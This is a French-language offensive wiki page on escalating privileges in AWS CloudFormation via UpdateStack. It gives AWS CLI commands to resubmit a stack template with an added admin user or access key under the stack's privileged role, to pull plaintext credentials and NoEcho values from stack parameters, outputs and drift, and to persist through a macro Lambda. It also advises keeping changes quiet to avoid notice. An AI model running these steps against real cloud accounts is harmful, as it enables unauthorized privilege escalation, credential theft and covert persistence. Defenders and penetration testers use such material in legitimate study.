---
title: "UpdateStack : modifier une stack qui exécute un rôle de stack privilégié"
description: "cloudformation:UpdateStack pour modifier une stack qui s'exécute avec un rôle de stack privilégié et provisionner des ressources contrôlées par l'attaquant."
keywords:
  - UpdateStack
  - CloudFormation
  - rôle de stack
  - déploiement
  - ressource
---

# UpdateStack

Une stack CloudFormation déployée peut avoir été créée avec un **rôle de stack** plus privilégié que vous. `cloudformation:UpdateStack` réutilise ce rôle stocké par défaut, de sorte que soumettre un modèle modifié provisionne tout ce que le rôle peut créer, y compris des principaux IAM, sans aucun `PassRole` de votre part.

## Mettre à jour avec le rôle stocké

```bash
# fetch the current template, add an admin user or policy attachment, resubmit
aws cloudformation get-template --stack-name <stack> --query TemplateBody > t.json
# edit t.json to add e.g. an AWS::IAM::User with an access key
aws cloudformation update-stack --stack-name <stack> \
  --template-body file://t.json --capabilities CAPABILITY_NAMED_IAM
```

## Piller les secrets des stacks et des modèles

Avant toute modification, lisez les stacks existantes : les paramètres et les sorties contiennent couramment des identifiants en clair, et `NoEcho` ne masque un paramètre que dans la console, pas dans le modèle ni dans la vue de dérive.

```bash
aws cloudformation describe-stacks --query 'Stacks[].{N:StackName,P:Parameters,O:Outputs}'
aws cloudformation get-template --stack-name <stack> --template-stage Processed
# recover a NoEcho parameter value from the processed/rendered resources or a drift diff
aws cloudformation detect-stack-drift --stack-name <stack>
aws cloudformation describe-stack-resource-drifts --stack-name <stack>
```

## Persister avec une macro

Une **macro** CloudFormation est une Lambda que CloudFormation invoque pour transformer les modèles. Enregistrer une macro (ou pointer une macro existante vers une fonction que vous contrôlez) signifie que chaque future opération de stack qui y fait référence exécute votre Lambda au sein du pipeline de déploiement, un point d'ancrage durable qui ressemble à une infrastructure normale.

```bash
aws cloudformation create-stack --stack-name m --template-body file://macro.yaml \
  --capabilities CAPABILITY_IAM   # macro.yaml defines AWS::CloudFormation::Macro -> your Lambda
```

## Notes d'exploitation

- La stack réutilise son rôle existant sauf si vous passez un `--role-arn` différent, de sorte que vous héritez de ses privilèges gratuitement.
- Gardez le reste du modèle intact pour éviter de détruire des ressources et d'attirer l'attention : ajoutez, ne remplacez pas.
- Les sorties de la stack peuvent faire ressortir directement la clé créée.

## Outils

- **AWS CLI** (`cloudformation get-template` / `update-stack`).
- **Pacu** : modules CloudFormation.

## Références

- [Rhino Security Labs: AWS privilege escalation (UpdateStack)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
